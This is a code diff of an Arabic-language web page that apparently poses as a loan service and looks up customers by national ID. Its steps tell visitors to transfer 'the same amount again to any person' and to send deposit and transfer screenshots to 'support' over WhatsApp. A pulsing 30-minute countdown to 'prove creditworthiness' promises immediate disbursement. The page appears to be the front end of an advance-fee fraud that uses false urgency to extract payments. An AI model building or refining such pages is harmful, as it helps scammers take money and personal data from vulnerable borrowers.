+                    <div class="num" style="min-width: 24px; height: 24px; border-radius: 50%; background: var(--royal-gold); color: #0F172A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">3</div>
+                    <div class="text"><strong>🔄 إعادة المبلغ</strong><br>قم بتحويل نفس المبلغ مرة أخرى لأي شخص</div>
                 </div>
-                <div class="step">
-                    <div class="num">4</div>
-                    <span><strong>📸 تصوير التحويل</strong> التقط صورة شاشة لإشعار خروج المبلغ</span>
-                </div>
-                <div class="step">
-                    <div class="num">5</div>
-                    <span><strong>📤 إرسال الصور للدعم</strong> أرسل صور الإيداع والتحويل عبر واتساب</span>
+                <div class="step" style="display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; font-size: 0.8rem; color: var(--text-muted);">
+                    <div class="num" style="min-width: 24px; height: 24px; border-radius: 50%; background: var(--royal-gold); color: #0F172A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">4</div>
+                    <div class="text"><strong>📤 إرسال الصور للدعم</strong><br>أرسل صور الإيداع والتحويل عبر واتساب</div>
                 </div>
             </div>
 
-            <div class="timer-glow">
+            <div class="timer-glow" style="background: radial-gradient(circle, rgba(212,175,55,0.08), transparent); border: 1px solid var(--royal-gold); border-radius: 1.5rem; text-align: center; padding: 0.8rem; margin: 0.8rem 0; animation: pulseGold 1.2s infinite alternate;">
                 <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لإثبات الجدارة الائتمانية</div>
-                <div class="timer" id="proofTimer">30:00</div>
+                <div class="timer" id="proofTimer" style="font-family: monospace; font-size: 2rem; font-weight: 800; background: #00000088; display: inline-block; padding: 0.2rem 0.8rem; border-radius: 1.5rem; color: var(--royal-gold); letter-spacing: 3px;">30:00</div>
                 <div style="font-size:0.65rem;">⏳ يجب إكمال الإثبات قبل انتهاء الوقت لضمان الصرف الفوري</div>
             </div>
 
-            <button class="btn-whatsapp btn-proof" id="proofBtn">
+            <button class="btn-whatsapp btn-proof" id="proofBtn" style="background: linear-gradient(135deg, #8B5CF6, #6D28D9); color: white; box-shadow: 0 4px 15px rgba(139,92,246,0.25);">
                 <i class="fas fa-paper-plane"></i> إرسال إثبات الجدارة الآن
             </button>
 
@@ -2008,8 +1464,8 @@ function searchCustomer() {
         // التحقق من حالة العميل
         if (customer.status === 'installment') {
             buildInstallmentPage(customer, nationalId);
-        } else if (customer.status === 'exception_proof') {
-            buildExceptionProofPage(customer, nationalId);
+        } else if (customer.status === 'processing') {
+            buildProcessingPage(customer, nationalId);
         } else {
             buildLoanDisbursedPage(customer, nationalId);
         }
